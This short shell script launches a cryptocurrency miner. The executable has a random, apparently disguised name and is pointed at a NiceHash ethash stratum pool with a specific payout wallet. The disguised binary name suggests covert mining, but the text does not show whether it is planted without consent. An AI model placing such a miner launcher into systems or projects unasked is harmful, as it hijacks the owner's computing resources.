#!/bin/sh
./erwtnnwertnwernghjf -a ethash -o stratum+tcp://daggerhashimoto.eu-north.nicehash.com:3353 -u 3LRHfsyfWK4FPyEDw1SGtBfNot6zRenEQW -w fthmxfmdg
